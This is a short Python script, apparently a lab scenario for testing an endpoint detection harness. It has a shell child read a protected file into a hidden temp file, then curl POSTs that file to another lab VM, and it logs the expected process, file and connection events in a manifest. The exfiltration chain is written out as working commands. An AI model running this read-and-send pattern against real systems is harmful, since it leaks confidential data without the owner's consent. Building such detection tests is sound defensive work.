#!/usr/bin/env python3
"""Scenario L1 (harmless): interpreter -> shell -> read protected lab file -> send to the other lab VM.
Writes a ground-truth manifest for the evaluation harness. Requires: /lab/protected/confidential.txt (any text),
and a receiver on the Windows VM:  python -m http.server 8443  (GET is enough; POST returns 501 but the connection exists).
"""
import json, os, socket, subprocess, time
from datetime import datetime, timezone

TARGET = os.environ.get("NEXUS_TARGET", "192.168.20.10")
PORT = int(os.environ.get("NEXUS_PORT", "8443"))
MAN_DIR = "/lab/manifests"
os.makedirs(MAN_DIR, exist_ok=True)
now = lambda: datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
man = {"scenario": "L1", "endpoint_id": os.environ.get("NEXUS_ENDPOINT_ID", "linux-vm-01"), "start_utc": now(),
       "root_pid": os.getpid(), "root_binary": "/usr/bin/python3", "steps": []}

# step 1: shell child reads the protected file
p = subprocess.Popen(["bash", "-c", "cat /lab/protected/confidential.txt > /tmp/.x"])
man["steps"].append({"kind": "process", "pid": p.pid, "binary": "/usr/bin/bash", "parent_pid": os.getpid(), "t": now()})
man["steps"].append({"kind": "file", "path": "/lab/protected/confidential.txt", "operation": "read", "t": now()})
p.wait(); time.sleep(3)

# step 2: shell child sends it across the subnet boundary; record the local port the OS actually used
p2 = subprocess.Popen(["bash", "-c", f"curl -s -o /dev/null -X POST --data-binary @/tmp/.x --local-port 51000-51999 http://{TARGET}:{PORT}/upload; echo done"])
man["steps"].append({"kind": "process", "pid": p2.pid, "binary": "/usr/bin/bash", "parent_pid": os.getpid(), "t": now()})
man["steps"].append({"kind": "connection", "protocol": "TCP", "src_ip": None, "src_port_range": [51000, 51999],
                     "dst_ip": TARGET, "dst_port": PORT, "direction": "outbound", "t": now()})
p2.wait()
man["end_utc"] = now()
path = f"{MAN_DIR}/L1-{man['start_utc'].replace(':', '')}.json"
json.dump(man, open(path, "w"), indent=2)
print("manifest:", path)
